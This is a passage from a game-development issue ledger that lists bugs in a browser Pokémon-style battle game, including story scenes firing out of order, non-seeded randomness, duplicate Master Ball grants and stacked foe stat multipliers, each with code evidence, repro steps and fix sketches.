**Verification**: A single multiplier function produces the C0-C2 softening; `grep` confirms the foe's per-stat scaling passes through exactly one city-keyed softening factor; the documented "~20% at C0" matches the realized value.

---

## <a id="ISSUE-011"></a> ISSUE-011: Entire MAIN finale (twist + ending) spoils before E1 — 6 league event-beats drain at once

---
id: ISSUE-011
severity: P1
category: bug
anchor_symbol: _resolveActiveRoadBeats
current_line_hint: ~42126
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4638d3b1dea5
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Entire MAIN finale (twist + ending) spoils before E1 — 6 league event-beats drain at once

**Evidence**:
```js
// _ROAD_BY_ARRAY_IDX marks E1..E4/Champion/Rival/Mystery all = 'league'.
// MAIN_STORY_BEATS @ league (event-kind): event6, event7, event8, event9, mfReveal, ending.
// _tryFireRoadStoryBeats(ev) at the FIRST league battle (E1, array idx 59):
const queue = _resolveActiveRoadBeats('league'); // → all 6 unfired event beats
_playStoryBeatQueue(queue, 0, () => processNextEvent());   // plays them back-to-back, then E1
// main.event7 body: "After E4, pre-Champion…"   main.event8: "After Champion, pre-Rival final…"
// main.mfReveal: "He says — 'I am The First. You become me…'"  main.ending: "…door…onto the Battle Frontier."
```

**Repro**: Reach City9 → Enter Pokémon League → first event is E1 (idx 59, road 'league'). `processNextEvent` runs `_tryFireRoadStoryBeats` first; `_resolveActiveRoadBeats('league')` returns every unfired event-kind league beat. Player sees event6→event7("After E4")→event8("After Champion")→event9("Hall of Fame closes")→**mfReveal("the face under the cap is yours… I am The First")**→**ending("the door opens onto the Battle Frontier")** — all before fighting E1.

**Blast radius**: The whole League/finale arc. The "it was you all along" twist (`main.mfReveal`) and the post-game ending (`main.ending`) fire BEFORE E1, the Champion, and the Mystery Figure battle. The narrative payoff of the entire main track is destroyed. This is the maximum-severity instance of the maintainer's "what fires ≠ proper order" class. (Supersedes/specializes ledger ISSUE-223, which only counted the clumping.)

**Fix sketch**: Road anchor is too coarse for the league. Either (a) re-anchor event7→after-E4 row, event8→after-Champion row, event9/mfReveal/ending→post-HoF Mystery row (give beats a `rowAnchor` sub-position the dispatcher honors), or (b) gate `_resolveActiveRoadBeats('league')` to fire at most ONE event beat per league battle row in narrative order. mfReveal + ending must fire only after the Mystery Figure (row 67) resolves.

**Verification**: Walk E1→E4→Champion→Rival→HoF→Mystery; confirm event6 fires at E1, event7 after E4, event8 after Champion, and mfReveal/ending only after the Mystery Figure battle — never before.

---

## <a id="ISSUE-012"></a> ISSUE-012: Villain-track "ending" event fires before the villain boss fight (road7 event-kind drains first)

---
id: ISSUE-012
severity: P1
category: bug
anchor_symbol: _resolveActiveRoadBeats
current_line_hint: ~42126
file: battle.html
agents: [story-mode-investigator]
fingerprint: 13be257103c9
confidence: high
status: open
---

**Title**: Villain-track "ending" event fires before the villain boss fight (road7 event-kind drains first)

**Evidence**:
```js
// VILLAIN_STORY_BEATS[track] @ road7 in source/iteration order: event6(event), boss(boss), ending(event).
// _resolveActiveRoadBeats filters to kind==='event' only → returns [event6, ending] in one queue.
function _tryFireRoadStoryBeats(ev){ const queue=_resolveActiveRoadBeats(road); _playStoryBeatQueue(queue,0,…); }
// Played at the first road7 Battle (array idx 48). The boss BATTLE beat fires later via
// _activeBattleBeatForCurrentRow(). So order is: event6 → ending → [boss fight].
```

**Repro**: Any villain track (rocket/magma/…). road7 = array idx 48,49,51,52 (Victory-Road Elites + City8 Gym Trainers). On the first of those, `_resolveActiveRoadBeats('road7')` returns both `event6` and `ending` (both event-kind). They play together; the `boss` battle (Giovanni etc.) only fires afterward through `_activeBattleBeatForCurrentRow`. The arc's resolution prose ("ending") plays before the climactic boss is fought.

**Blast radius**: All 10 villain tracks. The villain arc's conclusion is shown before its boss battle — every run that rolls a villain track (always, since one is rolled at run start) hits this. Same root cause as the league finding (road anchor is the only ordering key; event-beats always precede battle-beats on the same road).

**Fix sketch**: Within a road, the dispatcher must interleave event and battle beats in authored order rather than draining all event-kind first. Give `_resolveActiveRoadBeats` / `_activeBattleBeatForCurrentRow` a shared per-road ordered cursor so `boss` fires before `ending`, OR move `ending` to road8/league.

**Verification**: Run a villain track to road7; confirm event6 → boss fight → ending, in that order.

---

## <a id="ISSUE-013"></a> ISSUE-013: Casino Slots reel symbols rolled with Math.random(), breaking seeded determinism

---
id: ISSUE-013
severity: P1
category: bug
anchor_symbol: _slotsPickSymbol
current_line_hint: ~50954
file: battle.html
agents: [story-mode-investigator]
fingerprint: cbeb827d7355
confidence: high
status: open
---

**Title**: Casino Slots reel symbols rolled with Math.random(), breaking seeded determinism

**Evidence**:
```js
function _slotsPickSymbol(reelIdx) {
    const strip = CASINO_SLOTS_REEL_STRIPS[reelIdx];
    return strip[(Math.random() * strip.length) | 0];   // ~50954
}
```

**Repro**: Casino → Slots → Spin. Outcome-determining (casinoSlotsSpin → rolled.push(_slotsPickSymbol(i))).

**Blast radius**: Same seeded-RNG rule. _slotsPickSymbol is the payout determinant.

**Fix sketch**: Route _slotsPickSymbol through storyRngNext(). Cosmetic spin-strip filler may stay on Math.random.

**Verification**: Same-seed → identical reel results.

---

## <a id="ISSUE-014"></a> ISSUE-014: Boss immunity-round off-by-one: activation sets _bossImmuneTurns then decrements it in the SAME tick, so turns:1 grants 0 immune turns

---
id: ISSUE-014
severity: P1
category: bug
anchor_symbol: _storyBossMechanicsTurnTick
current_line_hint: ~42115
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 30b6eaa39800
confidence: high
status: fixed-main
---

**Title**: Boss immunity-round off-by-one: activation sets _bossImmuneTurns then decrements it in the SAME tick, so turns:1 grants 0 immune turns

**Evidence**:
```js
if (pending.type === 'immunityRound') {
    foeMon._bossImmuneTurns = (pending.turns | 0) || 1;   // step 1: set (=1 for main.mfBattle)
}
// ...
if (foeMon._bossImmuneTurns > 0) foeMon._bossImmuneTurns--; // step 2: immediately decrement → 0
```

**Repro**: `node scripts/debug/_repro/boss-mech2.mjs` — with `turns:1` (the production main.mfBattle config), `_bossImmuneTurns` is 0 after every tick, so the damage clamp at battle.html:23879 (`defender._bossImmuneTurns > 0`) never fires. With `turns:2` it survives exactly one turn. The set (step 1) and decrement (step 2) run in the same tick invocation.

**Blast radius**: Mystery Figure (main.mfBattle) immunity round ("PAUSE", every 5 turns) — telegraphs the banner but never actually blocks damage. (Currently moot because Finding 1 means the tick never runs, but this is a second independent defect that would surface the moment Finding 1 is fixed.)

**Fix sketch**: Decrement BEFORE activating the pending telegraph, or skip the decrement on the activation tick (e.g. set `_bossImmuneTurns = turns + 1` to compensate, or move the timer-decrement block above the pending-activation block).

**Verification**: `node scripts/debug/_repro/boss-mech2.mjs` must show `_bossImmuneTurns > 0` after the activation tick for `turns:1`; then a damaging move on that turn must log "braces — the attack does no damage!".

---

## <a id="ISSUE-015"></a> ISSUE-015: Boss HP-threshold "surge" (_bossSurgeTurns, +25% damage) has zero damage-path consumers — phase is banner-only

---
id: ISSUE-015
severity: P1
category: bug
anchor_symbol: _storyBossMechanicsTurnTick
current_line_hint: ~42114
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 7e37abfd6aab
confidence: high
status: fixed-main
---

**Title**: Boss HP-threshold "surge" (_bossSurgeTurns, +25% damage) has zero damage-path consumers — phase is banner-only

**Evidence**:
```js
foeMon._bossSurgeTurns = 3; // +25% damage flag for 3 turns   (only writer)
// ...
if (foeMon._bossSurgeTurns > 0) foeMon._bossSurgeTurns--;     // only reader (decrement)
```

**Repro**: `grep -nE '_bossSurgeTurns' battle.html` returns exactly two lines (42114 set, 42121 decrement) — no site in parseMoveEffects or the damage formula multiplies by it. `node scripts/debug/_repro/boss-mech.mjs` shows the counter set/ticking but it never alters damage. The HP-threshold phase (all 18 villain/raid bosses, at 0.25 HP; Mystery Figure at 0.50) shows a "PHASE INCOMING" banner and changes nothing mechanically.

**Blast radius**: Every BOSS_CONFIGS hpThresholdPhase mechanic (all 19 entries) — the headline "Phase 3 at 25% HP" boss design is purely cosmetic.

**Fix sketch**: In the main damage assembly (battle.html:~23671, after `modifier`), multiply by 1.25 when `attacker._bossSurgeTurns > 0` and the attacker is the boss (state.fActive). Mirror in aiEstimateDmg so AI KO math accounts for it.

**Verification**: Repro that drops boss to <=25% HP, advances one turn (telegraph→activate), then compares a fixed move's damage with vs without the surge flag; expect ~1.25x.

---

## <a id="ISSUE-016"></a> ISSUE-016: "Up next" preview computed from a different model than the dispatcher — ignores all story beats

---
id: ISSUE-016
severity: P1
category: inconsistency
anchor_symbol: _storyComputeUpNext
current_line_hint: ~49892
file: battle.html
agents: [story-mode-investigator]
fingerprint: 49f6e139a855
confidence: high
status: open
---

**Title**: "Up next" preview computed from a different model than the dispatcher — ignores all story beats

**Evidence**:
```js
function _storyComputeUpNext(opts){ // postVictory
  const row = STORY_EVENTS_RAW[sm.eventIndex];
  if (row[1]==='Battle'){
    if (_shouldFireWildBeforeBattle(idx) || _shouldFireRoamingBeforeBattle(idx) || _shouldFireCatchTutorialBeforeBattle(idx))
      return { icon:'🌿', text:'A wild encounter on the road' };
  }
  return _storyEventRowToUpNext(row);   // trainer / city / HoF label
}
// But processNextEvent's REAL next step is: _tryFireRoadStoryBeats(ev) FIRST (road event beats),
// THEN enterBattleEvent → cold-open → interrupts → _activeBattleBeatForCurrentRow scene → fight.
// _storyComputeUpNext knows nothing about _resolveActiveRoadBeats or _activeBattleBeatForCurrentRow.
```

**Repro**: Finish any battle whose next row sits on a road with an unfired event-beat (e.g. clearing City1's Gym Leader 1 → next is the road1 basic trainer; road1 has main.event1 + extra.<track>.event1 queued). The victory overlay's "Up next" pill shows "⚔ Basic Trainer — X" (or "🌿 A wild encounter"), but tapping Continue actually fires one or more full-screen story-beat scenes first.

**Blast radius**: Every transition surface that renders the pill (victory overlay @48316, catch screen @50661/51014). The label is structurally a different code path from `processNextEvent`/`enterBattleEvent`, so it is wrong wherever a beat is queued — the canonical "screen says X but Y fires" desync the overhaul targets.

**Fix sketch**: Compute the preview from the SAME resolution the dispatcher uses. Add a `_storyPeekNextDispatch()` that mirrors processNextEvent's order (road event beats → cold-open → interrupt → battle beat → battle/city) and returns the first thing that will actually render; have `_storyComputeUpNext` call it. Long-term: one ordered queue feeds both preview and dispatch (STORY_OVERHAUL_PLAN §4).

**Verification**: For a row with a queued road beat, the pill reads "📖 Story scene" (or the beat title); for a wild-prefixed row it reads wild; for a plain trainer it reads the trainer — matching the literal next screen in every case.

---

## <a id="ISSUE-017"></a> ISSUE-017: Foe stats pass through FOUR stacking multipliers on the live path (band × early × stage-gated × diff+league); band & stage-gated & league each triple-special-case Champion/Mystery

---
id: ISSUE-017
severity: P1
category: inconsistency
anchor_symbol: _storyEnemyStatMult
current_line_hint: ~33622
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 3fd8df38ef77
confidence: high
status: open
---

**Title**: Foe stats pass through FOUR stacking multipliers on the live path (band × early × stage-gated × diff+league); band & stage-gated & league each triple-special-case Champion/Mystery

**Evidence**:
```js
// startBattle live order: buildPokemon (applies _storyStatMult BAND) -> applyStoryLeagueFoeStatBoost -> applyFoeDifficultyScaling
// 47594 (enterBattleEvent): build._storyStatMult = _storyEnemyStatMult(event,city,row)  // BAND: C0 .80 -> C9 1.20, Champ 1.25, Myst 1.30
// 15163 (buildPokemon): mon.maxHp/stats *= _storyStatMult                                // stage A (applied ONCE here)
// 15032-41 (applyFoeDifficultyScaling): mult = diff * _earlyGameFoeStatMult() * _stageGatedFoeStatMult();
//   hpMult = mult + (lb.hp||0)   // league bonus is ADDITIVE here, not multiplicative
// _stageGatedFoeStatMult: Champ/Myst 1.20, E1-4 1.15 ; applyStoryLeagueFoeStatBoost: Champ +.40, Myst +.35, E1-4 +.22
```

**Repro**: `node scripts/debug/_repro/foe-scaling-map.mjs` (harness-verified deterministic). Measured compounded HP multiplier vs species base, Normal mode: Champion = band 1.25 × (stageGated 1.20 + league 0.40) = **1.99×**; Mystery = 1.30 × (1.20 + 0.35) = **2.01×**; E1-4 = 1.20 × (1.15 + 0.22) = **1.64×**. The three boss multipliers (`_STORY_FOE_STAT_BAND` "Phase 4.4", `_stageGatedFoeStatMult` "post-overhaul ramp", `applyStoryLeagueFoeStatBoost`) each special-case Champion+Mystery independently — a classic old-vs-new layering where the newer stage-gated ramp was meant to be the single source but the older band still runs on top.

**Blast radius**: Every story foe's effective power. Tuning any single function moves the curve unpredictably because three of them touch the same boss events. The canonical doc (`docs/PROGRESSION_CURVE_MASTER.md:135/179-181`) lists only Stage-gated + Difficulty + League and gives "Champion HP on Hard ≈ ×1.20 × ×1.40 × ×1.15" — it (a) never mentions the `_storyEnemyStatMult` band (`grep _STORY_FOE_STAT_BAND docs/` = 0 hits) and (b) states the league boost stacks *multiplicatively* when the code merges it *additively* (15039). So the documented Champion-Hard ≈1.495× understates the true ≈2.29× (1.25 × (1.20×1.15 + 0.40)).

**Fix sketch**: Collapse to ONE staging multiplier (the §4 "single source of truth" in STORY_OVERHAUL_PLAN). Either fold the per-city band into `_stageGatedFoeStatMult` and delete `_storyEnemyStatMult`'s boss overrides, or vice-versa — but no event should be scaled by two different boss constants. Then fix the doc's multiplicative-vs-additive league claim. (Balance numbers are maintainer-owned — propose, don't auto-change.)

**Verification**: After unifying, `node scripts/debug/_repro/foe-scaling-map.mjs` shows each event's HP multiplier traceable to exactly one function; doc formula matches measured.

---

## <a id="ISSUE-018"></a> ISSUE-018: "Up next" trainer name is the pre-override name — boss beats relabel the trainer after the preview

---
id: ISSUE-018
severity: P1
category: inconsistency
anchor_symbol: _storyEventRowToUpNext
current_line_hint: ~49922
file: battle.html
agents: [story-mode-investigator]
fingerprint: c55e0a763c3a
confidence: high
status: open
---

**Title**: "Up next" trainer name is the pre-override name — boss beats relabel the trainer after the preview

**Evidence**:
```js
// Preview reads the CURRENT assignment:
const trainerName = sm.trainerAssignments && sm.trainerAssignments[row[0] | 0];
const text = trainerName ? (role + ' — ' + trainerName) : role;
// But enterBattleEvent OVERRIDES it for boss/miniBoss/raid/mysteryBoss beats, AFTER the preview was shown:
sm.trainerAssignments[ev[0] | 0] = _canon;  // BEAT_CANON_TRAINER[sceneKey] e.g. 'Giovanni'
```

**Repro**: On a road7 battle row that will host the villain `boss` beat, the victory pill of the *previous* fight shows the row's generic assignment (e.g. "Elite Trainer — <random>"). When the player arrives, `enterBattleEvent` swaps the assignment to the canon villain ("Giovanni"/"Cyrus"/…) and shows that instead. Preview name ≠ fought name.

**Blast radius**: Every villain boss (10) + mini-boss (10) + the extra-track raids (which substitute a solo legendary, not a trainer at all — the pill still shows the row's generic trainer name). The preview's trainer label is unreliable for exactly the marquee fights.

**Fix sketch**: When peeking, resolve the canon override the same way `enterBattleEvent` does: if `_activeBattleBeatForCurrentRow()` is a boss/miniBoss/raid/mysteryBoss and `BEAT_CANON_TRAINER[sceneKey]` exists, surface that name (or "Raid: <species>" for extra raids) in the pill.

**Verification**: The pill for a boss-beat row names the canon villain (or the raid species); it matches the VS splash that follows.

---

## <a id="ISSUE-019"></a> ISSUE-019: Villain-boss Master Ball grant has no fire-once guard; unique-ball guarantee can break

---
id: ISSUE-019
severity: P1
category: bug
anchor_symbol: _storyGrantTrackEndReward
current_line_hint: ~41690
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1d05f5b87967
confidence: medium
status: fixed-main
---

**Title**: Villain-boss Master Ball grant has no fire-once guard; unique-ball guarantee can break

**Evidence**:
```js
if (/^villain\.[a-zA-Z]+\.boss$/.test(sk)) {
    if (!sm.balls) sm.balls = { poke:0, great:0, ultra:0, master:0 };
    sm.balls.master = (sm.balls.master | 0) + 1;   // no storyEventsFired / staticDrops guard
    try { save(); } catch (e) {}
    try { window.showGameAlert && window.showGameAlert('🎯 You found a MASTER BALL among the spoils.'); } catch (e) {}
```

**Repro**: `_storyGrantTrackEndReward(beat)` is invoked from two sites — the beat queue (`_playStoryBeatQueue`, ~41576) and the battle-injection victory hook (`onBattleEnd`, ~46888) — for the same `villain.*.boss` sceneKey. Neither caller dedupes the grant itself (only `sm.storyEventsFired[sk]` is set, and it is set AFTER the scene plays, and is not consulted inside the grant). A reload mid beat-queue, or both hooks firing for one boss, can add 2+ Master Balls.

**Blast radius**: Caged God boss arc — its entire challenge is "the Master Ball is the only guaranteed throw, saved for that one fight." A duplicate Master Ball lets the player burn one on a route wild (the locked-button toast at ~49437 is the only other safety net) and still cage the god, trivializing the post-game climax. Spec (STORY_MODE_FLOW.md) calls the Master Ball uniquely tracked.

**Fix sketch**: Gate the grant on a per-sceneKey once flag (e.g. `if (sm.staticDrops['mb_'+sk]) return; sm.staticDrops['mb_'+sk]=true;`) inside `_storyGrantTrackEndReward`, so neither call site nor a replay can double-grant.

**Verification**: Drive a villain-boss beat through both the beat-queue and the onBattleEnd hook in the jsdom harness; assert `sm.balls.master` increments by exactly 1.

---

## <a id="ISSUE-020"></a> ISSUE-020: Two Master Ball sources collide — villain-track boss (Road 7, pre-HoF) + post-HoF broker = 2 per run

---
id: ISSUE-020
severity: P1
category: balance
anchor_symbol: _storyGrantTrackEndReward
current_line_hint: ~42527
file: battle.html
agents: [story-mode-investigator]
fingerprint: a7a89682fc13
confidence: high
status: fixed-main
---

**Title**: Two Master Ball sources collide — villain-track boss (Road 7, pre-HoF) + post-HoF broker = 2 per run

**Evidence**:
```js
// _storyGrantTrackEndReward (live, fired from onBattleEnd victory hook @48130)
if (/^villain\.[a-zA-Z]+\.boss$/.test(sk)) {
    if (!sm.balls) sm.balls = { poke:0, great:0, ultra:0, master:0 };
    sm.balls.master = (sm.balls.master | 0) + 1;   // villain boss => +1 Master Ball
// AND continuePostGame @54865 (the §9 Caged-God path):
//   if (!sm.bossArc.available) { ...; sm.balls.master = (sm.balls.master | 0) + 1; }
```

**Repro**: Harness — `grantTrackEndReward({sceneKey:'villain.rocket.boss'})` then the `continuePostGame` `!bossArc.available` branch ⇒ `sm.balls.master === 2`. The villain boss beat resolves to road7 (array idxs 47–52), strictly PRE-HoF (HoF is array idx 65).

**Blast radius**: STORY_MODE_FLOW §6/§9 ("Master Ball ×1 from the boss arc", "1 per run") and the dex-100 milestone comment ("keeping the Master Ball uniquely tied to the Caged God arc") all assume exactly one Master Ball. A pre-HoF Master Ball also defeats §3's roaming-legendary design ("a Master Ball is the only guaranteed throw" — written assuming the player has none yet), letting the player guaranteed-catch a roaming sub-legendary mid-run, and leaves a spare for the Caged God.

**Fix sketch**: Decide the canon: either (a) the villain-boss reward should NOT be a Master Ball (use Ultra Balls / a trophy, like the dex-100 milestone deliberately does), or (b) the post-HoF broker grant should be conditional on `sm.balls.master === 0`. Option (a) preserves the boss-arc's "one Master Ball" identity; option (b) double-counts the villain boss as the source.

**Verification**: A full run that clears the villain track then enters the post-game should end with `sm.balls.master <= 1` (minus any spent).

---

## <a id="ISSUE-021"></a> ISSUE-021: Road event-beats fire before in-city Gym Trainer / Gym Leader fights, not only on the route

---
id: ISSUE-021
severity: P1
category: bug
anchor_symbol: _tryFireRoadStoryBeats
current_line_hint: ~42327
file: battle.html
agents: [story-mode-investigator]
fingerprint: 721b22bdaa85
confidence: high
status: open
---

**Title**: Road event-beats fire before in-city Gym Trainer / Gym Leader fights, not only on the route

**Evidence**:
```js
function _tryFireRoadStoryBeats(ev){
    if (!ev || ev[1] === 'City') return false;     // only City rows are skipped
    const road = _roadForArrayIdx(sm.eventIndex);  // road = currentGym-based, NOT route-vs-city aware
    const queue = _resolveActiveRoadBeats(road);
    if (!queue.length) return false;
    _playStoryBeatQueue(queue, 0, () => processNextEvent());
    return true;
}
// _ROAD_BY_ARRAY_IDX assigns 'roadN' to EVERY battle between Gym N and Gym N+1 —
// including the in-city Gym Trainer rows and (for the next gym's road) the Gym Leader row.
```

**Repro**: road3 spans array idx 19,20,21,23 — idx 23 is `Gym Trainer 1` *inside* City4's gym. If a road3 event-beat is still unfired when the player reaches the City4 gym, the beat scene plays as a "pre-battle" interrupt to the Gym Trainer fight, i.e. inside the gym rather than out on the road where the prose ("A Rocket grunt at the route stop…") is set.

**Blast radius**: Any beat that survives unfired until the gym (common — beats only fire when the player walks into a battle, and a player may go straight from the route to the gym). The road-flavored prose then plays out of place (in a gym). Pacing + setting mismatch across all tracks.

**Fix sketch**: Anchor road event-beats to actual route nodes only (the first battle of a new route, like `_isFirstBattleOfNewRoute`), or suppress `_tryFireRoadStoryBeats` on Gym Trainer / Gym Leader rows so route prose never plays inside a gym.

**Verification**: Force an unfired road-N beat, walk straight into Gym N+1's trainer fight; confirm the beat does NOT fire there (fires only on the route segment).

---

## <a id="ISSUE-022"></a> ISSUE-022: Player gimmick gate reads bare IIFE-private `sm` — always sees zero unlocked gimmicks

---
id: ISSUE-022
severity: P1
category: inconsistency
anchor_symbol: _withStoryPlayerGimmickGate
current_line_hint: ~11376
file: battle.html
agents: [consistency-auditor]
fingerprint: 416fa2aaed61
confidence: high
status: fixed-main
---

**Title**: Player gimmick gate reads bare IIFE-private `sm` — always sees zero unlocked gimmicks

**Evidence**:
```js
// line 11376, inside _withStoryPlayerGimmickGate (script-top, before the IIFE)
window._pbsStoryUnlockedGimmicks = (typeof sm !== 'undefined' && sm && Array.isArray(sm.unlockedGimmicks)) ? sm.unlockedGimmicks : [];
```

**Repro**: `sm` is private to the StoryMode IIFE (declared line 31724). `typeof sm` is always `'undefined'` here, so the ternary always yields `[]`. Every player-side acquisition path wrapped by this gate (incl. Cable Link per STORY_MODE_FLOW §15d) therefore sees an empty unlocked-gimmick list.

**Blast radius**: Mega / Z / Dynamax / Tera silently never roll on player-side acquisitions in story mode, even after the player has unlocked them. Not a crash (typeof-guarded) — a silent gameplay regression of the same scope-leak class.

**Fix sketch**: Read the live state via the public getter: `const sm = (window.StoryMode && window.StoryMode.state) || null;` then use it, matching the pattern at lines 13858+.

**Verification**: In a story run with mega unlocked, confirm `window._pbsStoryUnlockedGimmicks` includes `'mega'` during a player build roll.

---

## <a id="ISSUE-023"></a> ISSUE-023: aiDecision early-returns null on any choiceLock — AI cannot switch out of an immune/walled lock

---
id: ISSUE-023
severity: P1
category: bug
anchor_symbol: aiDecision
current_line_hint: ~19434
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 7413698eff37
confidence: high
status: fixed-claude/ecstatic-gauss-RY5hA
---

**Title**: aiDecision early-returns null on any choiceLock — AI cannot switch out of an immune/walled lock

**Evidence**:
```js
function aiDecision() {
    let attacker = state.fActive, defender = state.pActive;
    if (attacker.volatile.choiceLock) return null;   // <-- blocks ALL switches while choice-locked
    ...
```
Choice lock prevents changing *moves*, not switching Pokémon. This conflates the two: a choice-locked mon CAN legally switch, but the AI refuses to, so it is stranded re-using the locked move (paired with the getBestMove finding above).

**Repro**: `node scripts/debug/_repro/issue1-immune-spam.mjs` case (c): Choice-Specs Manectric locked into Thunderbolt vs Lightning Rod, with a Garchomp on the bench that would dominate the matchup. `aiDecision()` returns `null` (refuses to switch). `issue1-robust.mjs` confirms `aiDecision: null` while trapped.

**Blast radius**: Combines with finding 844cf5ce029b into a hard, inescapable loop the player triggers at will: switch an immunity/hard-wall into a choice-locked foe and it never threatens again. Whole-team-feed potential if the player keeps the wall healthy.

**Fix sketch**: Remove the blanket `choiceLock` early-return (or gate it): a choice-locked attacker should still be allowed to switch when its locked move is immune/zeroed or it is `willDieFirst`/hard-walled. Only true trapping (partialTrap, Arena Trap/Shadow Tag/Magnet Pull, ingrain — already handled just below) should force `null`.

**Verification**: Re-run case (c); with a strong bench it should return a switch index. Confirm `tests/property/priority-order` and existing ai-decision suites still pass (no regression in legitimate "don't switch, just attack" cases).

---

## <a id="ISSUE-024"></a> ISSUE-024: Difficulty tiers scale only enemy stats; AI policy is byte-identical at every tier — no rising *challenge*, just a rising stat-wall

---
id: ISSUE-024
severity: P1
category: balance
anchor_symbol: applyFoeDifficultyScaling
current_line_hint: ~13993
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1ebee7303e60
confidence: high
status: open
---

**Title**: Difficulty tiers scale only enemy stats; AI policy is byte-identical at every tier — no rising *challenge*, just a rising stat-wall

**Evidence**:
```js
// applyFoeDifficultyScaling (13993) — the entire "difficulty" knob is a stat multiplier:
if (d === 'veryeasy') mult = 0.70; else if (d === 'easy') mult = 0.85;
else if (d === 'hard') mult = 1.15; else if (d === 'challenge') mult = 1.30; // "Very Hard"
mult *= _earlyGameFoeStatMult(); mult *= window._stageGatedFoeStatMult();
// ...then mon.maxHp/stats *= mult.  getBestMove (18835-19310) and aiDecision
// (19313-19389) contain ZERO reads of storyDifficulty / sm.badges / tier / skill.
```

**Repro**: `scripts/debug/_repro/real-ai-test.mjs` (uses a non-stubbing loader; the test harness at tests/helpers/load-engine.js:229 replaces getBestMove with a slot-0 stub, so the real policy must be exercised directly). Charizard vs Venusaur, same seed, veryeasy vs challenge: the **real getBestMove picks the identical move 100/100 seeds** (Flamethrower), while foe HP scales 1.85x and Atk 1.875x. Static grep: `awk 'NR>=18835&&NR<=19310' battle.html | grep -E 'difficulty|badges|tier|skill'` returns nothing.

**Blast radius**: Whole story curve VERY EASY->VERY HARD. The AI is already maximally competent at GL1 (type/KO/priority/switch/hazard/status-aware, considers the player's full party for hazards). "Higher difficulty" therefore = bigger numbers on the same brain. A Very Hard foe is a Very Easy foe with +85% HP/Atk, not a smarter opponent. This is the core gap vs the maintainer's "AI gets genuinely smarter at higher tiers" goal — quantified gap between low- and high-tier AI behavior is **zero**.

**Fix sketch**: Introduce an AI-competence axis gated on tier/badges (e.g., low tiers add larger random move jitter, disable switching/healing/setup heuristics, and ignore the player's bench; high tiers enable the full policy). Tie it to `storyDifficulty` and/or GL so behavior — not just stats — ramps.

**Verification**: Re-run real-ai-test.mjs after the change; assert the move/switch distribution diverges between veryeasy and challenge for matchups with a non-trivial best line.

---

## <a id="ISSUE-025"></a> ISSUE-025: Measured curve violates the "regular<player, gym slightly-above, E4 EQUAL" intent — GL1-2 are 0.67-0.83× the player, gyms overshoot to 1.5×, E4 is ~1.70× (not equal)

---
id: ISSUE-025
severity: P1
category: balance
anchor_symbol: applyFoeDifficultyScaling
current_line_hint: ~15023
file: battle.html
agents: [battle-engine-debugger]
fingerprint: b49545b14054
confidence: high
status: open
---

**Title**: Measured curve violates the "regular<player, gym slightly-above, E4 EQUAL" intent — GL1-2 are 0.67-0.83× the player, gyms overshoot to 1.5×, E4 is ~1.70× (not equal)

**Evidence**:
```text
# Measured: per-mon avg effective power (HP+atk+def+spa+spd+spe), foe team vs same-city
# FULLY-TRAINED player team (31 IVs, city-band EVs), Normal mode, mean over 8 seeds:
#   GL1 0.67  GL2 0.83  GL3 0.98  GL4 1.10  GL5 1.19  GL6 1.29  GL7 1.47  GL8 1.57
#   E1 1.70  E2 1.70  E3 1.71  E4 1.73  Champion 1.99  Mystery 2.35
# Intent (FOE_STAT_NERF_BY_CITY comment ~14935 + STORY_OVERHAUL_PLAN §2.5):
#   regular < player ; gym slightly ABOVE player (~1.05-1.15) ; Elite Four EQUAL (~1.0)
```

**Repro**: `node scripts/debug/_repro/curve-multiseed.mjs` (8 seeds) and `headtohead.mjs` (single seed, with foe/player-floor too). Determinism confirmed by `determinism.mjs` (same seed -> byte-identical team+stats). Three deviations from the maintainer's stated target: (1) **GL1/GL2 sit BELOW the player** (0.67/0.83×) — the early-game softening (`FOE_STAT_NERF_BY_CITY=[.80,.85,.90]` × band .80/.85) overcorrects against a trained player, inverting "gym above player." (2) **E4 ≈ 1.70×, not EQUAL** — the single largest miss vs intent; the Elite Four is a 70% stat-wall, not a parity check. (3) **Mid-late gyms overshoot** "slightly above": GL7 1.47×, GL8 1.57×. The curve is otherwise monotonic and smooth (the GL3->GL4 dip in single-seed runs is sampling noise; the 8-seed mean rises cleanly).

**Blast radius**: The entire perceived difficulty arc and the maintainer's core design goal. Because the AI brain is identical at every stage (existing P1 fingerprint 1ebee7303e60), this stat curve IS the difficulty curve. The intended "early easy, gyms a notch up, E4 a fair mirror match" reads instead as "first two gyms are pushovers, then a steepening wall that peaks at a 2.35× Mystery." Note this SUPERSEDES the framing of ISSUE-095 (2f6b5645d86f) whose "GL4=GL5 dead zone / mult 1.0" is now partially fixed (stage-gated GL4->1.01, GL5->1.03), but the measured overshoot at the top end is the live problem.

**Fix sketch**: Maintainer-owned numbers. To hit intent: lift GL1-2 toward ~1.05-1.10× (raise the C0-1 softening floors), and pull E1-4 down toward ~1.0× (drop the E1-4 stage-gated 1.15 and/or league +0.22 so the Elite Four mirrors the player). Re-target gyms to a flat ~1.10× band. Best done jointly with the multiplier-unification finding above so one knob per event is tuned.

**Verification**: Re-run `curve-multiseed.mjs`; assert GL1..GL8 in [1.05,1.20], E1-4 in [0.95,1.10], monotonic non-decreasing.

---

## <a id="ISSUE-026"></a> ISSUE-026: Sleep duration roll uses bare `Math.random()` (RNG drift on every sleep proc)

---
id: ISSUE-026
severity: P1
category: bug
anchor_symbol: applyStatus
current_line_hint: ~25882
file: battle.html
agents: [battle-engine-debugger, consistency-auditor]
fingerprint: 07e77424454f
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Sleep duration roll uses bare `Math.random()` (RNG drift on every sleep proc)

**Evidence**:
```js
// battle.html:25882
if (status === "SLP") mon.sleepDuration = Math.floor(Math.random() * 3) + 1;
```

Duration determines wake-up turn count, checked every turn in `canMove` (line 24221). Diverges every sleep proc.

**Repro**: Save before a foe is put to sleep with a fixed seed; reload — sleep duration varies. Distribution confirmed correct (1–3 spread matches Showdown), but the value is non-deterministic across replays.

**Blast radius**: Every Sleep Powder / Spore / Hypnosis / Dark Void proc. Sleep Talk move selection (line 20077, also bare) compounds the drift.

